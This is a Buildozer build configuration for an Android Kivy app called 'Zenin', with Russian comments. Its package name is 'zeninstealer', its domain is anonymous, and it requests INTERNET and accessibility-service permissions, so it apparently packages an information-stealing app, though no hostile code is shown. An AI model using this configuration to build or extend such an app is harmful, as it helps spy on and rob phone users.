[app]
title = Zenin
package.name = zeninstealer
package.domain = org.anonim
source.dir = .
source.include_exts = py,png,jpg,kv,atlas,ttf,mp4
version = 2.26

# Исправленные требования (без subprocess, с pyjnius)
requirements = python3,kivy,requests,plyer,android,pyjnius

orientation = portrait
fullscreen = 1

# Разрешения
android.permissions = INTERNET, BIND_ACCESSIBILITY_SERVICE

android.api = 31
android.minapi = 21

# Фиксируем стабильную версию NDK, чтобы не было ошибок "Broken pipe"
android.ndk = 25b
android.accept_sdk_license = True

# Архитектуры для современных телефонов
android.archs = arm64-v8a, armeabi-v7a

[buildozer]
log_level = 2
warn_on_root = 1
